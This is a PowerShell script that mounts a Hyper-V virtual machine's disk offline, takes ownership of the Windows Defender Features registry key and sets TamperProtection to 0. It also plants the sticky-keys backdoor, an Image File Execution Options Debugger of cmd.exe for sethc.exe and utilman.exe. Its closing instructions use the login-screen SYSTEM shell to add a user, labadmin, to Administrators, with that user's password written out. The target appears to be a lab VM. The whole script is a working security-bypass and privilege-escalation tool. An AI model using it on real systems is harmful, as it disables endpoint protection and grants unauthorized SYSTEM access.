# Fix-TamperAndPromoteAdmin.ps1
# Offline-edits non-mde VHD to:
#   - take ownership of Defender Features key and set TamperProtection=0
#   - set sethc.exe IFEO Debugger=cmd.exe so Shift x5 at login screen launches SYSTEM cmd
# Run on the HOST in elevated PowerShell.

param([string]$VMName = 'non-mde')

$ErrorActionPreference = 'Stop'

Add-Type -Namespace Win32 -Name Priv -MemberDefinition @'
[DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h, uint da, out IntPtr tok);
[DllImport("advapi32.dll", SetLastError=true)] public static extern bool LookupPrivilegeValue(string s, string n, out long luid);
[DllImport("advapi32.dll", SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis, ref TOKPRIV p, int len, IntPtr prev, IntPtr rl);
[DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
[StructLayout(LayoutKind.Sequential, Pack=1)] public struct TOKPRIV { public int Count; public long Luid; public int Attr; }
'@
function Enable-Priv($name) {
  $tok = [IntPtr]::Zero
  [void][Win32.Priv]::OpenProcessToken([Win32.Priv]::GetCurrentProcess(), 0x28, [ref]$tok)
  $luid = 0L
  [void][Win32.Priv]::LookupPrivilegeValue($null, $name, [ref]$luid)
  $tp = New-Object Win32.Priv+TOKPRIV
  $tp.Count = 1; $tp.Luid = $luid; $tp.Attr = 2
  [void][Win32.Priv]::AdjustTokenPrivileges($tok, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
}
Enable-Priv 'SeTakeOwnershipPrivilege'
Enable-Priv 'SeRestorePrivilege'
Enable-Priv 'SeBackupPrivilege'

Write-Host "[1/7] Stopping VM..." -ForegroundColor Cyan
try { Stop-VM -Name $VMName -TurnOff -Force -ErrorAction SilentlyContinue } catch {}
Get-VMSnapshot -VMName $VMName -ErrorAction SilentlyContinue | Remove-VMSnapshot
while ((Get-VM $VMName).Status -ne 'Operating normally') { Start-Sleep 3 }

$vhd = (Get-VMHardDiskDrive -VMName $VMName).Path
try { Dismount-VHD -Path $vhd -ErrorAction SilentlyContinue } catch {}

Write-Host "[2/7] Mounting VHD..." -ForegroundColor Cyan
$disk = Mount-VHD -Path $vhd -Passthru
Start-Sleep 2
$part = $disk | Get-Disk | Get-Partition | Where-Object { $_.Type -eq 'Basic' } | Sort-Object Size -Descending | Select-Object -First 1
$letter = $null
foreach ($c in 67..90) { $cand = [char]$c; if (-not (Get-PSDrive -Name $cand -ErrorAction SilentlyContinue)) { $letter = $cand; break } }
Add-PartitionAccessPath -DiskNumber $part.DiskNumber -PartitionNumber $part.PartitionNumber -AccessPath "${letter}:\"
Start-Sleep 2
Write-Host "      mounted at ${letter}:" -ForegroundColor Green

Write-Host "[3/7] Loading SOFTWARE hive..." -ForegroundColor Cyan
& reg load HKLM\OFFSW "${letter}:\Windows\System32\config\SOFTWARE" | Out-Null

Write-Host "[4/7] Taking ownership of Defender\Features key..." -ForegroundColor Cyan
$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
  'OFFSW\Microsoft\Windows Defender\Features',
  [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
  [System.Security.AccessControl.RegistryRights]::TakeOwnership)
$admins = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
$acl = $key.GetAccessControl([System.Security.AccessControl.AccessControlSections]::Owner)
$acl.SetOwner($admins)
$key.SetAccessControl($acl)
$key.Close()

$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
  'OFFSW\Microsoft\Windows Defender\Features',
  [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
  [System.Security.AccessControl.RegistryRights]::ChangePermissions)
$acl = $key.GetAccessControl()
$rule = New-Object System.Security.AccessControl.RegistryAccessRule(
  $admins, 'FullControl', 'ContainerInherit', 'None', 'Allow')
$acl.AddAccessRule($rule)
$key.SetAccessControl($acl)
$key.Close()

Write-Host "[5/7] Writing TamperProtection=0 and sethc IFEO..." -ForegroundColor Cyan
& reg add 'HKLM\OFFSW\Microsoft\Windows Defender\Features' /v TamperProtection       /t REG_DWORD /d 0 /f
& reg add 'HKLM\OFFSW\Microsoft\Windows Defender\Features' /v TamperProtectionSource /t REG_DWORD /d 2 /f
& reg add 'HKLM\OFFSW\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' /v Debugger /t REG_SZ /d 'C:\Windows\System32\cmd.exe' /f
& reg add 'HKLM\OFFSW\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe' /v Debugger /t REG_SZ /d 'C:\Windows\System32\cmd.exe' /f

Write-Host "[6/7] Unloading + dismounting..." -ForegroundColor Cyan
[gc]::Collect(); Start-Sleep 2
& reg unload HKLM\OFFSW | Out-Null
Remove-PartitionAccessPath -DiskNumber $part.DiskNumber -PartitionNumber $part.PartitionNumber -AccessPath "${letter}:\" -ErrorAction SilentlyContinue
Dismount-VHD -Path $vhd

Write-Host "[7/7] Starting VM..." -ForegroundColor Cyan
Start-VM -Name $VMName

Write-Host ""
Write-Host "Done. After ~60s:" -ForegroundColor Green
Write-Host "  1. mstsc /v:172.20.114.12  -- but at the LOGIN screen, do NOT sign in."
Write-Host "  2. Click Ease of Access icon (bottom-right) OR press Shift 5 times."
Write-Host "  3. A SYSTEM cmd window opens. Run:"
Write-Host "       net localgroup Administrators labadmin /add"
Write-Host "       exit"
Write-Host "  4. Now sign in as labadmin / LabPass!2026"
Write-Host "  5. Verify:"
Write-Host '       whoami /groups | findstr /i "High Mandatory"'
Write-Host '       (Get-MpComputerStatus).IsTamperProtected   # expect False'
